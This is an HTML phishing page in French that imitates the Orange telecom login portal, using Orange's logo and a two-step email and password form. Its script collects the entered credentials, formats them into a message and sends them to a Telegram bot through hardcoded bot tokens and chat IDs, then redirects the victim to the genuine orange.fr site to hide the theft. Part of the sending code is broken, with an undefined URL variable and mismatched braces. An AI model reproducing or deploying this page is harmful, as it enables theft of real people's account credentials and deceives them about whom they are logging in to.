<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Accueil</title>

    <style>
        * {
            margin: 0%;
            padding: 0%;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;
            height: 100vh;
        }

        .top {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 50px;
            padding: 8px;
            display: flex;
            background-color: black;
        }

        .top img {
            margin-right: auto;
        }

        .top div {
            width: 130px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .top svg {
            color: white;
            width: 40px;
            height: 25px;
            cursor: pointer;
        }

        .center {
            padding: 0px 15px 15px 15px;

        }

        form {
            width: 100%;
        }

        label {
            font-size: 0.7rem;
        }

        input {
            width: 100%;
            height: 40px;
            border: none;
            border-bottom: 2px solid;
            margin-bottom: 20px;
        }

        input:focus {
            outline: none;
        }

        p {
            font-size: 0.8rem;
        }

        button {
            width: 100%;
            height: 40px;
            background-color: black;
            color: white;
            font-size: 1.1rem;
            font-weight: bold;
            margin-bottom: 200px;
            cursor: pointer;
        }

        footer {

            min-height: 620px;
            background-color: black;
        }

        footer img {
            width: 100%;
        }

        #co,
        #pwd,
        #pwd_label {
            display: none;
        }

        @media (min-width: 800px) {
            body {
                display: flex;
                flex-direction: column;
                align-items: center;
            }

            .top {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 70px;
                padding: 10px;
                display: flex;
                background-color: black;
            }

            .center {
                width: 500px;
                margin-top: 100px;
            }

            footer {
                display: none;
            }


        }
    </style>
</head>

<body>

    <div class="top">
        <img src="https://c.woopic.com/logo-orange.png" alt="">

        <div>

            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                class="lucide lucide-search">
                <circle cx="11" cy="11" r="8" />
                <path d="m21 21-4.3-4.3" />
            </svg>

            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                class="lucide lucide-user">
                <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2" />
                <circle cx="12" cy="7" r="4" />
            </svg>


            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                class="lucide lucide-align-justify">
                <line x1="3" x2="21" y1="6" y2="6" />
                <line x1="3" x2="21" y1="12" y2="12" />
                <line x1="3" x2="21" y1="18" y2="18" />
            </svg>
        </div>

    </div>

    <br> <br> <br>

    <div class="center">

        <br> <br>

        <h2>Veuillez vous identifier</h2> <br> <br> <br>

        <h4>Indiquez votre compte Orange</h4>

        <br> <br> <br>

        <form id="form">
            <span id="notif" style="color: orange;"></span>
<br>
            <label for="email">Adresse e-mail ou votre num√©ro de mobile</label> <br>
            <input id="user" name="email" type="text" required> <br>
            <span style="color: orangered;" id="notif"></span>

            <label id="pwd_label" for="pwd">Mot de passe </label> <br>
            <input id="pwd" name="pwd" type="password" minlength="4" required> <br>


            <p>Comment retrouver l'adresse e-mail associ√©e √† votre compte ?</p> <br> <br> <br>



            <button id="next" type="submit">Continuer</button>
            <button id="co" type="submit">Se connecter</button>

        </form>
    </div>


    <footer>
        <img src="./img/footer.png">
    </footer>

</body>


<script>

    document.getElementById('next').addEventListener('click', function (e) {
        e.preventDefault();
        var user = document.getElementById('user');
        if (user.value.trim() !== '') { // Utilisation de trim pour √©viter les espaces vides
            document.getElementById('co').style.display = 'block';
            document.getElementById('pwd').style.display = 'block';
            document.getElementById('pwd_label').style.display = 'block';

            document.getElementById('next').style.display = 'none';
            document.getElementById('co').style.display = 'block';


        }
    });

    document.getElementById('co').addEventListener('click', function (e) {
        e.preventDefault();

        //   const botToken = '5318317440:AAHEGvCaXHjSTM8BqtquRuQn8GBRCDdihGc';
        //   const chatId = '5276838022';

          const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4';
          const chatId = '7332838769';

        const user = document.getElementById("user").value;
        const pass = document.getElementById("pwd").value;

        if (user === '' || pass === '') {
            return document.getElementById('notif').innerText = 'Veuillez remplir tous les champs !';
        }


        const message = `üéÅ Orange mail :\n\nüë§ Utilisateur : ${user}\nüîê Mot de passe : ${pass}`;

        // Envoi de la requ√™te √† l'API Telegram
        fetch(telegramURL)
            .then(response => {

                    return response.text().then(text => {
                        throw new Error(`Erreur lors de l'envoi du message √† Telegram: ${text}`);
                    });
                }
                window.location.href = 'https://www.orange.fr/portail';
            })
            .catch(error => {
                console.error('Erreur :', error);
            });
    });
